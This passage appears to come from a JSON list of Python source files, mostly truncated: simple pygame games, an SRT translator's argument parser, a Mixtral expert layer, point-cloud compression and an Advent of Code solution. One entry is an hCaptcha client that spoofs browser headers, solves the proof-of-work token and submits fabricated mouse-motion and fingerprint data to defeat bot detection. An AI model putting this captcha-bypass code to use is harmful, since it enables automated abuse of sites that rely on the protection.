snake.y<0:\n                snake.y=0\n                vel =0\n                vel_y=0 \n                t_p.clear()\n                Game_Over = True\n            if new == True:\n                random.shuffle(apple_pos)\n                for p1 in apple_pos[:]:\n                    apple = pygame.Rect(p1[0],p1[1],VEL,VEL)\n                    new = False\n            snake_pos2 = [snake.x,snake.y]\n            t_p.append(snake_pos2)\n            pygame.draw.rect(screen,(100,0,0),apple)\n            if snake.colliderect(apple):\n                new = True\n                snake_quantaty += 1\n            score = snake_quantaty+1\n            if len(t_p)-1 > snake_quantaty:\n                del t_p[0]\n            for x in t_p:\n                pygame.draw.rect(screen,(0,100,0),(x[0],x[1],VEL,VEL))\n                if snake_quantaty >0:\n                    if x == snake_pos:\n                        vel = 0\n                        vel_y = 0\n                        Game_Over = True\n            if score>=3 and score<6:\n                FPS=12\n            if score>=6 and score<8:\n                FPS=16\n            if score>=8 and snake_quantaty<12:\n                FPS=18\n     ",
    "# encoding:utf-8\nimport os\nimport configargparse as argparse\nfrom .constants import DEFAULT_PATH_IN, DEFAULT_PATH_COMPLETED, DEFAULT_PATH_OUT, MAX_THREAD, LINE_PER_REQUEST, \\\n    CONF_FILE_NAME\nfrom .log import logging\n\n\ndef get_args():\n    # \u89e3\u6790\u53c2\u6570\n    logging.info(\"\u89e3\u6790\u53c2\u6570\")\n    parser = argparse.ArgumentParser()\n    if os.path.exists(CONF_FILE_NAME):\n        print(f'\u4f7f\u7528\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6:{CONF_FILE_NAME}')\n        parser.add_argument(\"-c\", \"--config\", required=False, is_config_file=True, default=CONF_FILE_NAME,\n                            help=\"\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\")\n    else:\n        parser.add_argument(\"-c\", \"--config\", required=False, is_config_file=True, help=\"\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\")\n    parser.add_argument('--path_in', type=str, default=DEFAULT_PATH_IN, help='\u8f93\u5165srt\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84')\n    parser.add_argument('--path_completed', type=str, default=DEFAULT_PATH_COMPLETED, help='\u5df2\u5b8c\u6210srt\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84')\n    parser.add_argument('--path_out', type=str, default=DEFAULT_PATH_OUT, help='\u8f93\u51fasrt\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84')\n    parser.add_argument('--max_thread', type=int, default=MAX_THREAD, help='\u6700\u5927\u7ebf\u7a0b\u6570')\n    parser.add_argument('--line_per_request', type=int, default=LINE_PER_REQUEST, help='\u6bcf\u6b21\u8bf7\u6c42\u7684\u884c\u6570')\n    parser.add_argument('--api_key', type=str, default='', help='OpenAI API key')\n    parser.add_argument('--mirror_url', type=str, default=None, help='OpenAI mirror url')\n\n    options = parser.parse_args()\n\n    return options\n",
    "\"\"\" PyTorch Mixtral model.\"\"\"\nimport inspect\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\nfrom collections import OrderedDict\n\nfrom transformers import PreTrainedModel\n\nfrom config import MixtralConfig\n\nclass ClassInstantier(OrderedDict):\n    def __getitem__(self, key):\n        content = super().__getitem__(key)\n        cls, kwargs = content if isinstance(content, tuple) else (content, {})\n        return cls(**kwargs)\n\nACT2CLS = {\n    \"relu\": nn.ReLU,\n    \"relu6\": nn.ReLU6,\n    \"sigmoid\": nn.Sigmoid,\n    \"silu\": nn.SiLU,\n    \"swish\": nn.SiLU,\n    \"tanh\": nn.Tanh,\n}\nACT2FN = ClassInstantier(ACT2CLS)\n\n\n\n_CONFIG_FOR_DOC = \"MixtralConfig\"\n\n\n\nclass MixtralBlockSparseTop2MLP(nn.Module):\n    def __init__(self, config: MixtralConfig):\n        super().__init__()\n        self.ffn_dim = config.intermediate_size\n        self.hidden_dim = config.hidden_size\n\n        self.w1 = nn.Linear(self.hidden_dim, self.ffn_dim, bias=False)\n        self.w2 = nn.Linear(self.ffn_dim, self.hidden_dim, bias=False)\n        self.w3 = nn.Linear(self.hidden_dim, self.ffn_dim, bias=False)\n\n        self.act_fn = ACT2FN[config.hidden_act]\n\n    def forward(self, hidden_states):\n        current_hidden_states = self.act_fn(self.w1(hidden_states)) * self.w3(hidden_states)\n        current_hidden_states = self.w2(current_hidden_states)\n        return current_hidden_states\n\n\nclass MixtralBLockSparseTop2MLP(MixtralBlockSparseTop2MLP):\n    def __init__(self, *args, **kwargs):\n        logger.warning_once(\n            \"MixtralBLockSparseTop2MLP is deprecated by MixtralBlockSparseTop2MLP and will be removed in v4.40.\"\n        )\n        super().__init__(*args, **kwargs)\n\n\nclass MixtralSparseMoeBlock(nn.Module):\n    \"\"\"\n    This implementation is\n    strictly equivalent to standard MoE with full capacity (no\n    dropped tokens). It's faster since it formulates MoE operations\n    in terms of block-sparse operations to accomodate imbalanced\n    assignments of tokens to experts, whereas standard MoE either\n    (1) drop tokens at the cost of reduced performance or (2) set\n    capacity factor to number of experts and thus waste computation\n    and memory on padding.\n    \"\"\"\n\n    def __init__(self, config):\n        super().__init__()\n        self.hidden_dim = config.hidden_size\n        self.ffn_dim = config.intermediate_size\n        self.num_experts = config.num_local_experts\n        self.top_k = config.num_experts_per_tok\n\n        # gating\n        self.gate = nn.Linear(self.hidden_dim, self.num_experts, bias=False)\n\n        self.experts = nn.ModuleList([MixtralBlockSparseTop2MLP(config) for _ in range(self.num_experts)])\n\n    def forward(self, hidden_states: torch.Tensor) -> torch.Tensor:\n        \"\"\" \"\"\"\n        batch_size, sequence_length, hidden_dim = hidden_states.shape\n        # [20, 512]\n        hidden_states = hidden_states.view(-1, hidden_dim)\n        # router_logits: (batch * sequence_length, n_experts)\n        #  [20,512] * [512,8]   --->   [20,8] \n        router_logits = self.gate(hidden_states)\n        # print(f\"router_logits is {router_logits}\") \n        # print(f\"router_logits1 shape is {router_logits.shape}\")\n        # [20,8]\n        '''\n            \u6bcf\u4e2atoken\u5bf9\u5e94\u7684\u4e13\u5bb6\u7684\u6982\u7387\n        '''\n        routing_weights = F.softmax(router_logits, dim=1, dtype=torch.float)\n        # print(f\"router_logits2 shape is {router_logits.shape}\")\n        print(f\"router_logits3  is {routing_weights}\")\n        # [20,2]\n        # selected_experts\u5bf9\u5e94\u6bcf\u4e2atoken\u9009\u7684\u4e13\u5bb6\u5728[0,7]\u7684\u7d22\u5f15 \u5b83\u662f\u6709\u68af\u5ea6\u7684\n        routing_weights, selected_experts = torch.topk(routing_weights, self.top_k, dim=-1)\n        print(f\"router_logits3 shape is {routing_weights.shape}\")\n        print(f\"router_logits3  is {routing_weights}\")\n\n        routing_weights /= routing_weights.sum(dim=-1, keepdim=True)\n        # print(f\"router_logits4 shape is {router_logits.shape}\")\n        # we cast back to the input dtype\n        routing_weights = routing_weights.to(hidden_states.dtype)\n        # print(f\"router_logits5 shape is {router_logits.shape}\")\n\n        # [20,512] \u51680\u77e9\u9635\n        final_hidden_states = torch.zeros(\n            (batch_size * sequence_length, hidden_dim), dtype=hidden_states.dtype, device=hidden_states.device\n        )\n\n        # One hot encode the selected experts to create an expert mask\n        # this will be used to easily index which expert is going to be sollicitated\n        # [8,2,20]\n        expert_mask = torch.nn.functional.one_hot(selected_experts, num_classes=self.num_experts).permute(2, 1, 0)\n\n        # Loop over all available experts in the model and perform the computation on each expert\n        for expert_idx in range(self.num_experts):\n            expert_layer = self.experts[expert_idx]\n            # idx\u662f\u4e24\u884c\u4e2d\u7684\u54ea\u4e00\u884c top_x\u662f\u6bcf\u5217\u7684\u54ea\u4e00\u5217 \u53c2\u8003test.ipynb\u6587\u4ef6\u8bf4\u660e\n            idx, top_x = torch.where(expert_mask[expert_idx])\n\n            # \n  ",
    "#!/usr/bin/env python\n\n# Space Invaders\n# Created by Lee Robinson\n\nfrom pygame import *\nimport sys\nfrom os.path import abspath, dirname\nfrom random import choice\n\nBASE_PATH = abspath(dirname(__file__))\nFONT_PATH = BASE_PATH + '/fonts/'\nIMAGE_PATH = BASE_PATH + '/images/'\nSOUND_PATH = BASE_PATH + '/sounds/'\n\n# Colors (R, G, B)\nWHITE = (255, 255, 255)\nGREEN = (78, 255, 87)\nYELLOW = (241, 255, 0)\nBLUE = (80, 255, 239)\nPURPLE = (203, 0, 255)\nRED = (237, 28, 36)\n\nSCREEN = display.set_mode((800, 600))\nFONT = FONT_PATH + 'space_invaders.ttf'\nIMG_NAMES = ['ship', 'mystery',\n             'enemy1_1', 'enemy1_2',\n             'enemy2_1', 'enemy2_2',\n             'enemy3_1', 'enemy3_2',\n             'explosionblue', 'explosiongreen', 'explosionpurple',\n             'laser', 'enemylaser']\nIMAGES = {name: image.load(IMAGE_PATH + '{}.png'.format(name)).convert_alpha()\n          for name in IMG_NAMES}\n\nBLOCKERS_POSITION = 450\nENEMY_DEFAULT_POSITION = 65  # Initial value for a new game\nENEMY_MOVE_DOWN = 35\n\n\nclass Ship(sprite.Sprite):\n    def __init__(self):\n        sprite.Sprite.__init__(self)\n        self.image = IMAGES['ship']\n        self.rect = self.image.get_rect(topleft=(375, 540))\n        self.speed = 5\n\n    def update(self, keys, *args):\n        if keys[K_LEFT] and self.rect.x > 10:\n            self.rect.x -= self.speed\n        if keys[K_RIGHT] and self.rect.x < 740:\n            self.rect.x += self.speed\n        game.screen.blit(self.image, self.rect)\n\n\nclass Bullet(sprite.Sprite):\n    def __init__(self, xpos, ypos, direction, speed, filename, side):\n        sprite.Sprite.__init__(self)\n        self.image = IMAGES[filename]\n        self.rect = self.image.get_rect(topleft=(xpos, ypos))\n        self.speed = speed\n        self.direction = direction\n        self.side = side\n        self.filename = filename\n\n    def update(self, keys, *args):\n        game.screen.blit(self.image, self.rect)\n        self.rect.y += self.speed * self.direction\n        if self.rect.y < 15 or self.rect.y > 600:\n            self.kill()\n\n\nclass Enemy(sprite.Sprite):\n    def __init__(self, row, column):\n        sprite.Sprite.__init__(self)\n        self.row = row\n        self.column = column\n        self.images = []\n        self.load_images()\n        self.index = 0\n        self.image = self.images[self.index]\n        self.rect = self.image.get_rect()\n\n    def toggle_image(self):\n        self.index += 1\n        if self.index >= len(self.images):\n            self.index = 0\n        self.image = self.images[self.index]\n\n    def update(self, *args):\n        game.screen.blit(self.image, self.rect)\n\n    def load_images(self):\n        images = {0: ['1_2', '1_1'],\n                  1: ['2_2', '2_1'],\n                  2: ['2_2', '2_1'],\n                  3: ['3_1', '3_2'],\n                  4: ['3_1', '3_2'],\n                  }\n        img1, img2 = (IMAGES['enemy{}'.format(img_num)] for img_num in\n                      images[self.row])\n        self.images.append(transform.scale(img1, (40, 35)))\n        self.images.append(transform.scale(img2, (40, 35)))\n\n\nclass EnemiesGroup(sprite.Group):\n    def __init__(self, columns, rows):\n        sprite.Group.__init__(self)\n        self.enemies = [[None] * columns for _ in range(rows)]\n        self.columns = columns\n        self.rows = rows\n        self.leftAddMove = 0\n        self.rightAddMove = 0\n        self.moveTime = 600\n        self.direction = 1\n        self.rightMoves = 30\n        self.leftMoves = 30\n        self.moveNumber = 15\n        self.timer = time.get_ticks()\n        self.bottom = game.enemyPosition + ((rows - 1) * 45) + 35\n        self._aliveColumns = list(range(columns))\n        self._leftAliveColumn = 0\n        self._rightAliveColumn = columns - 1\n\n    def update(self, current_time):\n        if current_time - self.timer > self.moveTime:\n            if self.direction == 1:\n                max_move = self.rightMoves + self.rightAddMove\n            else:\n                max_move = self.leftMoves + self.leftAddMove\n\n            if self.moveNumber >= max_move:\n                self.leftMoves = 30 + self.rightAddMove\n                self.rightMoves = 30 + self.leftAddMove\n                self.direction *= -1\n                self.moveNumber = 0\n                self.bottom = 0\n                for enemy in self:\n                    enemy.rect.y += ENEMY_MOVE_DOWN\n                    enemy.toggle_image()\n                    if self.bottom < enemy.rect.y + 35:\n                        self.bottom = enemy.rect.y + 35\n            else:\n                velocity = 10 if self.direction == 1 else -10\n                for enemy in self:\n                    enemy.rect.x += velocity\n                    enemy.toggle_image()\n                self.moveNumber += 1\n\n            self.timer += self.moveTime\n\n    def add_internal(self, *sprites):\n        super(EnemiesGroup, self).add_internal(*sprites)\n        for s in sprites:\n            self.enemies[s.row][s.column] = s\n\n    def remove_internal(self, *sprites):\n        super(",
    "import pygame\n\nclass Agent:\n    def __init__(self, color):\n        self.color = color\n\n    def move(self, board):\n        if self.color == \"red\":\n            print(\"Red player's turn\")\n        else:\n            print(\"Black player's turn\")\n\n        selected_piece = None\n        valid_moves = []\n\n        while True:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT:\n                    pygame.quit()\n                    return\n\n                if event.type == pygame.MOUSEBUTTONDOWN:\n                    mouse_pos = pygame.mouse.get_pos()\n                    row, col = mouse_pos[1] // 100, mouse_pos[0] // 100\n                    piece = board.get_piece(row, col)\n\n                    if piece and piece.color == self.color:\n                        if selected_piece == piece:\n                            board.select_piece(row, col)\n                            board.unhighlight_squares()\n                            selected_piece = None\n                            valid_moves = []\n                        else:\n                            board.unhighlight_squares()\n                            selected_piece = piece\n                            valid_moves = board.get_valid_moves(piece)\n                            board.highlight_valid_moves(valid_moves)\n                    else:\n                        if selected_piece:\n                            if (row, col) in valid_moves:\n                                board.move_piece(selected_piece, (row, col))\n                                board.unhighlight_squares()\n                                return\n                            else:\n                                board.unhighlight_squares()\n                                selected_piece = None\n                                valid_moves = []\n\n    def __init__(self, color):\n        self.color = color\n\nclass Piece:\n    def __init__(self, color, position):\n        self.color = color\n        self.position = position\n        self.is_king = False\n\n    def make_king(self):\n        self.is_king = True\n\nclass Board:\n    def __init__(self):\n        self.board = []\n        self.selected_piece = None\n        self.turn = \"red\"\n        self.initialize_board()\n\n    def initialize_board(self):\n        for row in range(8):\n            self.board.append([])\n            for col in range(8):\n                if row < 3 and (row + col) % 2 == 1:\n                    self.board[row].append(Piece(\"black\", (row, col)))\n                elif row > 4 and (row + col) % 2 == 1:\n                    self.board[row].append(Piece(\"red\", (row, col)))\n                else:\n                    self.board[row].append(None)\n\n    def get_piece(self, row, col):\n        return self.board[row][col]\n\n    def get_valid_moves(self, piece):\n        valid_moves = []\n        row, col = piece.position\n        color = piece.color\n\n        # Regular moves\n        if color == \"red\":\n            # Red pieces move upwards\n            if row > 0:\n                if col > 0 and self.board[row - 1][col - 1] is None:\n                    valid_moves.append((row - 1, col - 1))\n                if col < 7 and self.board[row - 1][col + 1] is None:\n                    valid_moves.append((row - 1, col + 1))\n        else:\n            # Black pieces move downwards\n            if row < 7:\n                if col > 0 and self.board[row + 1][col - 1] is None:\n                    valid_moves.append((row + 1, col - 1))\n                if col < 7 and self.board[row + 1][col + 1] is None:\n                    valid_moves.append((row + 1, col + 1))\n\n        # Capturing moves\n        self.get_capturing_moves(piece, row, col, valid_moves)\n\n        # TODO: Handle king pieces\n        # if piece.is_king:\n        #     # Add valid moves for king pieces (moving backwards)\n        #     pass\n\n        return valid_moves\n    \n    def get_capturing_moves(self, piece, row, col, valid_moves):\n        color = piece.color\n        opponent_color = \"black\" if color == \"red\" else \"red\"\n\n        # Check capturing moves in all four directions\n        directions = [(-1, -1), (-1, 1), (1, -1), (1, 1)]\n        for dr, dc in directions:\n            if 0 <= row + 2 * dr < 8 and 0 <= col + 2 * dc < 8:\n                if (\n                    self.board[row + dr][col + dc] is not None\n                    and self.board[row + dr][col + dc].color == opponent_color\n                    and self.board[row + 2 * dr][col + 2 * dc] is None\n                ):\n                    valid_moves.append((row + 2 * dr, col + 2 * dc))\n                    self.get_capturing_moves(piece, row + 2 * dr, col + 2 * dc, valid_moves)\n\n    def highlight_square(self, position, color):\n        row, col = position\n        pygame.draw.rect(screen, color, (col * 100, row * 100, 100, 100), 4)\n        pygame.display.update()\n\n    def unhighlight_squares(self):\n        self.selected_piece = None\n        self.render()\n\n    def highlight_valid_moves(self, valid_moves):\n        for move in valid_moves:\n           ",
    "from datetime import date, datetime\r\nimport math\r\nimport base64\r\nimport httpx\r\nimport urllib\r\nimport hashlib\r\nfrom json import dumps\r\nimport json\r\nimport os\r\nimport random\r\n\r\nheaders = {\r\n    \"Host\": \"hcaptcha.com\",\r\n    \"Connection\": \"keep-alive\",\r\n    \"sec-ch-ua\": 'Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92',\r\n    \"Accept\": \"application/json\",\r\n    \"sec-ch-ua-mobile\": \"?0\",\r\n    \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\",\r\n    \"Content-type\": \"application/json; charset=utf-8\",\r\n    \"Origin\": \"https://newassets.hcaptcha.com\",\r\n    \"Sec-Fetch-Site\": \"same-site\",\r\n    \"Sec-Fetch-Mode\": \"cors\",\r\n    \"Sec-Fetch-Dest\": \"empty\",\r\n    \"Referer\": \"https://newassets.hcaptcha.com/\",\r\n    \"Accept-Language\": \"en-US,en;q=0.9\"\r\n\r\n}\r\n\r\ndef N_Data(req) -> str:\r\n        try:\r\n            \"\"\"\r\n            this part takes the req value inside the getsiteconfig and converts it into our hash, we need this for the final step.\r\n            (thanks to h0nde for this function btw, you can find the original code for this at the top of the file.)\r\n            \"\"\"\r\n            x = \"0123456789/:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\n\r\n            req = req.split(\".\")\r\n\r\n            req = {\r\n                \"header\": json.loads(\r\n                    base64.b64decode(\r\n                        req[0] +\r\n                        \"=======\").decode(\"utf-8\")),\r\n                \"payload\": json.loads(\r\n                    base64.b64decode(\r\n                        req[1] +\r\n                        \"=======\").decode(\"utf-8\")),\r\n                \"raw\": {\r\n                    \"header\": req[0],\r\n                    \"payload\": req[1],\r\n                    \"signature\": req[2]}}\r\n\r\n            def a(r):\r\n                for t in range(len(r) - 1, -1, -1):\r\n                    if r[t] < len(x) - 1:\r\n                        r[t] += 1\r\n                        return True\r\n                    r[t] = 0\r\n                return False\r\n\r\n            def i(r):\r\n                t = \"\"\r\n                for n in range(len(r)):\r\n                    t += x[r[n]]\r\n                return t\r\n\r\n            def o(r, e):\r\n                n = e\r\n                hashed = hashlib.sha1(e.encode())\r\n                o = hashed.hexdigest()\r\n                t = hashed.digest()\r\n                e = None\r\n                n = -1\r\n                o = []\r\n                for n in range(n + 1, 8 * len(t)):\r\n                    e = t[math.floor(n / 8)] >> n % 8 & 1\r\n                    o.append(e)\r\n                a = o[:r]\r\n\r\n                def index2(x, y):\r\n                    if y in x:\r\n                        return x.index(y)\r\n                    return -1\r\n                return 0 == a[0] and index2(a, 1) >= r - 1 or -1 == index2(a, 1)\r\n\r\n            def get():\r\n                for e in range(25):\r\n                    n = [0 for i in range(e)]\r\n                    while a(n):\r\n                        u = req[\"payload\"][\"d\"] + \"::\" + i(n)\r\n                        if o(req[\"payload\"][\"s\"], u):\r\n                            return i(n)\r\n\r\n            result = get()\r\n            hsl = \":\".join([\r\n                \"1\",\r\n                str(req[\"payload\"][\"s\"]),\r\n                datetime.now().isoformat()[:19]\r\n                .replace(\"T\", \"\")\r\n                .replace(\"-\", \"\")\r\n                .replace(\":\", \"\"),\r\n                req[\"payload\"][\"d\"],\r\n                \"\",\r\n                result\r\n            ])\r\n            return hsl\r\n        except Exception as e:\r\n            print(e)\r\n            return False\r\n\r\ndef REQ_Data(host, sitekey):\r\n        try:\r\n            r = httpx.get(f\"https://hcaptcha.com/checksiteconfig?host={host}&sitekey={sitekey}&sc=1&swa=1\", headers=headers ,timeout=4)\r\n            if r.json()[\"pass\"]:\r\n                return r.json()[\"c\"]\r\n            else:\r\n                return False\r\n        except :\r\n            return False\r\n\r\ndef Get_Captcha(host, sitekey, n, req, hc_accessibility):\r\n        try:\r\n            json = {\r\n                \"sitekey\": sitekey,\r\n                \"v\": \"04f9464\",\r\n                \"host\": host,\r\n                \"n\": n,\r\n                'motiondata': '{\"st\":1711870450214,\"mm\":[[119,23,1711870731141],[37,58,1711870740204],[32,48,1711870740220],[26,35,1711870740236],[22,28,1711870740253],[19,25,1711870740269],[17,24,1711870740286],[17,24,1711870740353],[19,25,1711870740370],[19,25,1711870740386]],\"mm-mp\":420.1190476190476,\"md\":[[19,25,1711870740382]],\"md-mp\":0,\"mu\":[[19,25,1711870740456]],\"mu-mp\":0,\"v\":1,\"topLevel\":{\"st\":1711870448985,\"sc\":{\"availWidth\":1512,\"availHeight\":889,\"width\":1512,\"height\":982,\"colorDepth\":30,\"pixelDepth\":30,\"top\":0,\"left\":0,\"availTop\":38,\"availLeft\":0,\"mozOrientation\":\"landscape-primary\",\"onmozorientationchange\":null},\"nv\":{\"permissions\":{},\"pdfViewerEnabled\":true,\"doNotTrack\":\"1\",\"maxTouchPoints\":0,\"mediaCapabilities\":{},\"oscpu\":\"Intel Mac OS X 10.15\",\"vendor\":\"\",\"vendorSub\":\"\",\"",
    "import os, time\nimport numpy as np\nimport torch\nimport MinkowskiEngine as ME\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\nfrom data_utils import array2vector, istopk, sort_sparse_tensor, load_sparse_tensor, scale_sparse_tensor\nfrom data_utils import write_ply_ascii_geo, read_ply_ascii_geo\nfrom gpcc import gpcc_encode, gpcc_decode\nfrom pc_error import pc_error\nfrom pcc_model import PCCModel\n\nclass CoordinateCoder():\n    \"\"\"encode/decode coordinates using gpcc\n    \"\"\"\n    def __init__(self, filename):\n        self.filename = filename\n        print(filename)\n        self.ply_filename = filename + '.ply'\n\n    def encode(self, coords, postfix=''):\n        coords = coords.numpy().astype('int')\n        write_ply_ascii_geo(filedir=self.ply_filename, coords=coords)\n        gpcc_encode(self.ply_filename, self.filename+postfix+'_C.bin')\n        \n        return \n\n    def decode(self, postfix=''):\n        print(self.filename)\n        gpcc_decode(self.filename+postfix+'_C.bin', self.ply_filename)\n        coords = read_ply_ascii_geo(self.ply_filename)\n        \n        return coords\n\n\nclass FeatureCoder():\n    \"\"\"encode/decode feature using learned entropy model\n    \"\"\"\n    def __init__(self, filename, entropy_model):\n        self.filename = filename\n        self.entropy_model = entropy_model.cpu()\n\n    def encode(self, feats, postfix=''):\n        strings, min_v, max_v = self.entropy_model.compress(feats.cpu())\n        shape = feats.shape\n        with open(self.filename+postfix+'_F.bin', 'wb') as fout:\n            fout.write(strings)\n        with open(self.filename+postfix+'_H.bin', 'wb') as fout:\n            fout.write(np.array(shape, dtype=np.int32).tobytes())\n            fout.write(np.array(len(min_v), dtype=np.int8).tobytes())\n            fout.write(np.array(min_v, dtype=np.float32).tobytes())\n            fout.write(np.array(max_v, dtype=np.float32).tobytes())\n            \n        return \n\n    def decode(self, postfix=''):\n        with open(self.filename+postfix+'_F.bin', 'rb') as fin:\n            strings = fin.read()\n        with open(self.filename+postfix+'_H.bin', 'rb') as fin:\n            shape = np.frombuffer(fin.read(4*2), dtype=np.int32)\n            len_min_v = np.frombuffer(fin.read(1), dtype=np.int8)[0]\n            min_v = np.frombuffer(fin.read(4*len_min_v), dtype=np.float32)[0]\n            max_v = np.frombuffer(fin.read(4*len_min_v), dtype=np.float32)[0]\n\n        feats = self.entropy_model.decompress(strings, min_v, max_v, shape, channels=shape[-1])\n        \n        return feats\n\n\nclass Coder():\n    def __init__(self, model, filename):\n        self.model = model \n        self.filename = filename\n        self.coordinate_coder = CoordinateCoder(filename)\n        self.feature_coder = FeatureCoder(self.filename, model.entropy_bottleneck)\n\n    @torch.no_grad()\n    def encode(self, x, postfix=''):\n        # Encoder\n        y_list = self.model.encoder(x)\n        y = sort_sparse_tensor(y_list[0])\n        num_points = [len(ground_truth) for ground_truth in y_list[1:] + [x]]\n\n        with open(self.filename+postfix+'_num_points.bin', 'wb') as f:\n            f.write(np.array(num_points, dtype=np.int32).tobytes())\n\n        self.feature_coder.encode(y.F, postfix=postfix)\n        self.coordinate_coder.encode((y.C//y.tensor_stride[0]).detach().cpu()[:,1:], postfix=postfix)\n        return y\n\n    @torch.no_grad()\n    def decode(self, rho=1, postfix=''):\n        # decode coords\n        y_C = self.coordinate_coder.decode(postfix=postfix)\n        y_C = torch.cat((torch.zeros((len(y_C),1)).int(), torch.tensor(y_C).int()), dim=-1)\n        indices_sort = np.argsort(array2vector(y_C, y_C.max()+1))\n        y_C = y_C[indices_sort]\n        # decode feat\n        y_F = self.feature_coder.decode(postfix=postfix)\n        y = ME.SparseTensor(features=y_F, coordinates=y_C*8,tensor_stride=8, device=device)\n        # decode label\n        with open(self.filename+postfix+'_num_points.bin', 'rb') as fin:\n            num_points = np.frombuffer(fin.read(4*3), dtype=np.int32).tolist()\n\n            num_points[-1] = int(rho * num_points[-1])# update\n\n            num_points = [[num] for num in num_points]\n        # decode\n        _, out = self.model.decoder(y, nums_list=num_points, ground_truth_list=[None]*3, training=False)\n\n        return out\n\nif __name__ == '__main__':\n    import argparse\n    parser = argparse.ArgumentParser(\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    parser.add_argument(\"--ckptdir\", default='./ckpts/r02/epoch_8.pth')\n    parser.add_argument(\"--filedir\", default='/media/ivc-18/958e2f20-9a21-425d-8061-48542c9ca6c5/testdata/8iVFB/ricardo_vox9.ply')\n    parser.add_argument(\"--scaling_factor\", type=float, default=1.0, help='scaling_factor')\n    parser.add_argument(\"--rho\", type=float, default=1.0, help='the ratio of the number of output points to the number of input points')\n    parser.add_argument(\"--res\", type=int, default=511, help='resolution')\n    args = parser.parse_args()\n    f",
    "traitMap = {\n    \"x\":0,\n    \"m\":1,\n    \"a\":2,\n    \"s\":3\n}\n\ndef solvepart1():\n    #read in data\n    data = fileRead(\"input.txt\")\n    partsReached = False\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            partsReached = True\n            continue\n        if not partsReached:\n            line = row.split(\"{\")\n            name = line[0]\n            steps = line[1][:-1].split(\",\")\n            workflows[name] = tuple(steps)\n        else:\n            vals = row[1:-1].split(\",\")\n            parts.append((int(vals[0][2:]),int(vals[1][2:]),int(vals[2][2:]),int(vals[3][2:])))\n\n    #determine whether each part should be rejected or not\n    sum = 0\n    for part in parts:\n        valid = acceptOrRejectPart(part, workflows)\n        if valid:\n            sum = sum + (part[0] + part[1] + part[2] + part[3])\n    print(sum)\n\n#goes through workflows and determines whether a part should be rejected or not\ndef acceptOrRejectPart(part, workflows):\n    currentWorkflow = \"in\"\n    while (currentWorkflow not in (\"R\",\"A\")):\n        rules = workflows[currentWorkflow]\n        for rule in rules:\n            if (\"<\" not in rule) and (\">\" not in rule):\n                currentWorkflow = rule\n                break\n            comp, dest = rule.split(\":\")\n            if \"<\" in comp:\n                trait, amount = comp.split(\"<\")\n                if part[traitMap[trait]] < int(amount):\n                    currentWorkflow = dest\n                    break\n            else:\n                trait, amount = comp.split(\">\")\n                if part[traitMap[trait]] > int(amount):\n                    currentWorkflow = dest\n                    break\n\n    if currentWorkflow == \"A\":\n        return True\n    return False\n\ndef solvepart2():\n    #read in data\n    data = fileRead(\"input.txt\")\n    workflows = {}\n    parts = []\n    for rawRow in data:\n        row = rawRow.strip()\n        if row == \"\":\n            break\n        line = row.split(\"{\")\n        name = line[0]\n        steps = line[1][:-1].split(\",\")\n        workflows[name] = tuple(steps)\n\n    #run recursive function to determine the number of possible parts\n    numParts = acceptOrRejectRange(((1,4001),(1,4001),(1,4001),(1,4001)), \"in\", workflows)\n    print(numParts)\n\n    #determine whether each part should be rejected or not\n    \n#recursively takes a range through the workflow, splitting it into multiple ranges as necessary\n#returns number of possible accepted parts\ndef acceptOrRejectRange(partRange, currentWorkflow, workflows):\n    if (currentWorkflow == \"R\"):\n        return 0\n    if (currentWorkflow == \"A\"):\n        print(partRange, (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0]))\n        return (partRange[0][1] - partRange[0][0]) * (partRange[1][1] - partRange[1][0]) * (partRange[2][1] - partRange[2][0]) * (partRange[3][1] - partRange[3][0])\n    \n    sum = 0\n    curPartRange = list(partRange)\n    rules = workflows[currentWorkflow]\n    for rule in rules:\n        if (\"<\" not in rule) and (\">\" not in rule):\n            sum = sum + acceptOrRejectRange(curPartRange, rule, workflows)\n            break\n        comp, dest = rule.split(\":\")\n        if \"<\" in comp:\n            trait, splitPos = comp.split(\"<\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\"<\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (newPartRange[traitMap[trait]][0], splitPos)\n            curPartRange[traitMap[trait]] = (splitPos, curPartRange[traitMap[trait]][1])\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n        else:\n            trait, splitPos = comp.split(\">\")\n            splitPos = int(splitPos)\n            newPartRange = curPartRange.copy()\n            print(\">\", newPartRange[traitMap[trait]], splitPos)\n            newPartRange[traitMap[trait]] = (splitPos+1, newPartRange[traitMap[trait]][1])\n            curPartRange[traitMap[trait]] = (curPartRange[traitMap[trait]][0], splitPos+1)\n            sum = sum + acceptOrRejectRange(tuple(newPartRange), dest, workflows)\n    return sum\n\ndef fileRead(name):\n    data = []\n    f = open(name, \"r\")\n    for line in f:\n        data.append(line);\n    return data\n\n\nsolvepart2()",
